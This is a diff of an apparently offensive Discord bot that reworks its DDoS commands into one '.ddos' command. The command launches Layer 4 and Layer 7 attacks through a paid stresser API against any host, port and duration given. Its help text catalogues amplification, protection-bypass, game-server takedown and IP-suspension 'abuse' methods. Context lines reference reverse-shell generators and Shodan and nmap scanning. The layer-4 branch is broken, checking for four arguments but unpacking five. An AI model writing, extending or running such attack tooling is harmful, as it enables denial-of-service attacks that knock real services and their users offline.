@@ -106,8 +106,7 @@ async def h(ctx):
     embed2.add_field(name='.dnsDumpster', value='Use dnsDumpster unoficiall api', inline=True)
     embed2.add_field(name='.shodanSearch', value='Use shodan to find IOT Device IPs', inline=True)
     embed2.add_field(name='.nmapPortScan', value='Run an NMAP Port scan', inline=True)
-    embed2.add_field(name='.launch_layer7_attack', value='Example: <api_key> <host> <port> <time> <method> (Methods: AUTOMATION, BYPASS, SOCKET, SPAMMER, BYPASS, ELITE)', inline=True)
-    embed2.add_field(name='.get_running_attacks', value='Get list of running DDoS Attacks')
+    embed2.add_field(name='.ddos', value='', inline=True)
     await ctx.send(embed=embed2)
 
 
@@ -222,81 +221,157 @@ async def genShellPy(ctx, ip=None, port=None):
     await ctx.send(pyBeginning + pyShell)
 
 @bot.command()
-async def get_running_attacks(ctx):
+async def ddos(ctx, action, *args):
     api_url = "https://stresse.ru/api/api.php"
     api_key = "YOUR_API_KEY"  # Replace with your API key
-    action = "running"
 
-    params = {
-        "key": api_key,
-        "action": action
-    }
+    if action == "help":
+        await ctx.send(f'''
+Layer 4 Methods
 
-    try:
-        response = requests.get(api_url, params=params)
-        if response.status_code == 200:
-            json_response = response.json()
-            if json_response.get("status"):
-                attacks = json_response.get("body")
-                await ctx.send(f"Running Attacks:\n{attacks}")
+Layer 4 methods are meant for IPv4 targets, using UDP and TCP protocols for attacks.
+
+Method      Protocol Description
+-------     -------- -----------
+UDP-AMP     UDP      Powerful multi-protocol UDP reflection method, combines all the most powerful amplification protocols into one attack.
+NTP         UDP      UDP reflection method that uses vulnerable NTP servers for amplification.
+DNS         UDP      UDP reflection method that uses vulnerable DNS servers for amplification.
+ARD         UDP      UDP reflection method that uses vulnerable ARD servers for amplification, capable of bypassing some OVH and other protected hosts.
+WSD         UDP      UDP reflection method that uses vulnerable WSD servers for amplification, capable of bypassing some OVH and other protected hosts.
+SSDP        UDP      UDP reflection method that uses vulnerable SSDP servers for amplification.
+DVR         UDP      UDP reflection method that uses vulnerable DVR servers for amplification.
+SNMP        UDP      UDP reflection method that uses vulnerable SNMP servers for amplification.
+CHARGEN     UDP      UDP reflection method that uses vulnerable CHARGEN servers for amplification.
+UDP-SYNERGY UDP      An insanely powerful UDP method, requires a minimum of 10 Simultaneous Attacks to launch.
+TCP-AMP     TCP      TCP reflection method that amplifies 8-15Gbps of TCP traffic, currently bypassing many protected servers.
+TCP-REFLECT TCP      TCP reflection method that uses a large pool of IPs and many different TCP protocols combined, similar to TCP-AMP but exchanges volume for greater IP/Protocol variation.
+ICMP-AMP    ICMP     ICMP amplification attack, can cause lag on some servers.
+UDP-ABUSE   UDP      Exotic UDP Abuse method that attempts to get a target IP suspended by generating abuse reports; this is not meant to DDoS an IP, it is intended to suspend the IP from its hosting.
+UDP         UDP      Powerful UDP bypass method that randomizes each IP header and payload to bypass protections and security.
+GAME-SOURCE UDP      Uses Source Engine Query to take down Valve/Source servers, very effective if the server is not protected.
+UDP-INSTANT-ABUSE UDP Like the regular ABUSE method but with better IP selection and faster suspensions.
+UDP-BYPASS  UDP      UDPBYPASS is made to target applications using UDP on the targeted port to attempt to create the most legitimate traffic out on the application.
+GAME-FIVEM  UDP      Bypass method for GTA V servers that are using the FiveM multiplayer modification framework.
+GAME-RAKNET UDP      Targeting the widely used cross-platform multiplayer game networking engine, allowing DDoS attacks on games like Rust, Minecraft PE, RageMP, and many other games.
+GAME-MINECRAFT UDP  Uses crafted Minecraft queries to take down Minecraft servers, very effective if the server is not protected.
+GAME-QUAKE  UDP      Uses QUAKE engine queries, also works with games like Soldier of Fortune 2, Nexuiz, Quake 3, Wolfenstein, Star Trek Elite Force, Urban Terror, Star Wars JK2, Call of Duty (1, 2, 3, 4, MW2, UO), Star Wars JK, Star Trek Elite Force 2, FiveM, and Tremulous.
+GAME-UNTURNED UDP    Bypass servers running the Unturned game, effective against many servers.
+GAME-FIVEMV2 UDP      Bypass servers running the SAMP game, effective against many servers.
+TCP-ABUSE   TCP      Exotic TCP Abuse method that attempts to get a target IP suspended by generating abuse reports; this is not meant to DDoS an IP, it is intended to suspend the IP from its hosting.
+TCP-INSTANT-ABUSE TCP Like the regular ABUSE method but with better IP selection and faster suspensions.
+TCP-SYN     TCP      Spoofed SYN packets flood, tweaked to bypass some protections, fully customizable.
+TCP-ACK     TCP      Spoofed ACK packets flood, tweaked to bypass some protections, fully customizable.
+TCP-RAND    TCP      Spoofed randomized TCP flags packets flood, tweaked to bypass some protections, fully customizable.
+TCP-PROTECT TCP      Powerful TCP method that can bypass various servers.
+TCP-SYNACK  TCP      Powerful method that emulates a SYN-ACK handshake.
+TCP-DATA    TCP      TCP method that attempts to emulate a real connection with SYN and PSH+ACK data.
+ICMP        ICMP     Old-school ICMP attack, causes lag and CPU usage on some servers.
+
+Layer 7 Methods
+
+Layer 7 methods are meant for URL targets, using HTTP/HTTPs protocols for attacks.
+
+Method      Protocol Description
+-------     -------- -----------
+AUTOMATION  HTTP     Effective method for HTTP/HTTPs
+BYPASS      HTTP     Effective method for HTTP/HTTPs
+SOCKET      HTTP     Socket method for mass requests
+SPAMMER     HTTP     Spammer method for mass requests
+BYPASS      HTTP     Powerful layer 7 attack.
+SOCKET      HTTP     Powerful layer 7 attack.
+AUTOMATION  HTTP     Powerful layer 7 attack.
+SPAMMER     HTTP     Powerful layer 7 attack.
+ELITE       HTTP
+''')
+    elif action == "get_running_attacks":
+        action = "running"
+        params = {"key": api_key, "action": action}
+        try:
+            response = requests.get(api_url, params=params)
+            if response.status_code == 200:
+                json_response = response.json()
+                if json_response.get("status"):
+                    attacks = json_response.get("body")
+                    await ctx.send(f"Running Attacks:\n{attacks}")
+                else:
+                    await ctx.send("API request was not successful.")
             else:
-                await ctx.send("API request was not successful.")
+                await ctx.send(f"API request failed with status code: {response.status_code}")
+        except Exception as e:
+            await ctx.send(f"An error occurred: {str(e)}")
+    elif action == "launch_layer4_attack":
+        if len(args) == 4:
+            api_key, host, port, time, method = args
+            base_url = "https://stresse.ru/api/api.php"
+            action = "layer4"
+            url = f"{base_url}?key={api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"
+
+            try:
+                response = requests.get(url)
+                if response.status_code == 200:
+                    data = response.json()
+                    if data.get("status"):
+                        await ctx.send(f"Success: {data.get('body')}, Attack ID: {data.get('attack_id')}")
+                    else:
+                        await ctx.send(f"API Error: {data.get('body')}")
+                else:
+                    await ctx.send(f"Request to the API failed with status code: {response.status_code}")
+            except Exception as e:
+                await ctx.send(f"Failed to connect to the API: {str(e)}")
         else:
-            await ctx.send(f"API request failed with status code: {response.status_code}")
-    except Exception as e:
-        await ctx.send(f"An error occurred: {str(e)}")
+            await ctx.send("Usage: .ddos launch_layer4_attack <api_key> <host> <port> <time> <method>")
+    elif action == "launch_layer7_attack":
+        if len(args) >= 5:
+            host, port, time, method, *extra_args = args
+            postdata = cookie = referer = useragent = req = delay = con = None
 
-@bot.command()
-async def stresse_layer4(ctx, api_key, host, port, time, method):
-    base_url = "https://stresse.ru/api/api.php"
-    action = "layer4"
-    url = f"{base_url}?key={api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"
+            if len(extra_args) >= 1:
+                postdata = extra_args[0]
+            if len(extra_args) >= 2:
+                cookie = extra_args[1]
+            if len(extra_args) >= 3:
+                referer = extra_args[2]
+            if len(extra_args) >= 4:
+                useragent = extra_args[3]
+            if len(extra_args) >= 5:
+                req = extra_args[4]
+            if len(extra_args) >= 6:
+                delay = extra_args[5]
+            if len(extra_args) >= 7:
+                con = extra_args[6]
 
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get("status"):
-                await ctx.send(f"Success: {data.get('body')}, Attack ID: {data.get('attack_id')}")
+            print(f'[LOGS] Running Layer 7 attack on {host} {port} | Method: {method} | Time: {time}')
+            api_key = ''  # Replace with your actual API key
+
+            api_url = "https://stresse.ru/api/api.php"
+            params = {
+                "key": api_key,
+                "action": "layer7",
+                "host": host,
+                "port": port,
+                "time": time,
+                "method": method,
+                "postdata": postdata,
+                "cookie": cookie,
+                "referer": referer,
+                "useragent": useragent,
+                "req": req,
+                "delay": delay,
+                "con": con
+            }
+
+            response = requests.get(api_url, params=params)
+
+            if response.status_code == 200:
+                response_json = response.json()
+                if response_json.get("status"):
+                    await ctx.send(f"Success: {response_json['body']}, Attack ID: {response_json['attack_id']}")
+                else:
+                    await ctx.send(f"API Error: {response_json.get('error', 'Unknown error')}")
             else:
-                await ctx.send(f"API Error: {data.get('body')}")
+                await ctx.send(f"Your connection to API failed (Error {response.status_code}), check your connection and try again")
         else:
-            await ctx.send(f"Request to the API failed with status code: {response.status_code}")
-    except Exception as e:
-        await ctx.send(f"Failed to connect to the API: {str(e)}")
-
-@bot.command()
-async def launch_layer7_attack(ctx, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
-    print(f'[LOGS] Running Layer 7 attack on {host} {port} | Method: {method} | Time: {time}')
-    api_key = ''  # Replace with your actual API key
-
-    api_url = "https://stresse.ru/api/api.php"
-    params = {
-        "key": api_key,
-        "action": "layer7",
-        "host": host,
-        "port": port,
-        "time": time,
-        "method": method,
-        "postdata": postdata,
-        "cookie": cookie,
-        "referer": referer,
-        "useragent": useragent,
-        "req": req,
-        "delay": delay,
-        "con": con
-    }
-
-    response = requests.get(api_url, params=params)
-
-    if response.status_code == 200:
-        response_json = response.json()
-        if response_json.get("status"):
-            await ctx.send(f"Success: {response_json['body']}, Attack ID: {response_json['attack_id']}")
-        else:
-            await ctx.send(f"API Error: {response_json.get('error', 'Unknown error')}")
-    else:
-        await ctx.send(f"Your connection to API failed (Error {response.status_code}), check your connection and try again")
+            await ctx.send("Usage: .ddos launch_layer7_attack <host> <port> <time> <method> [postdata] [cookie] [referer] [useragent] [req] [delay] [con]")
 
 @bot.command()
 async def genShellPerl(ctx, ip=None, port=None):
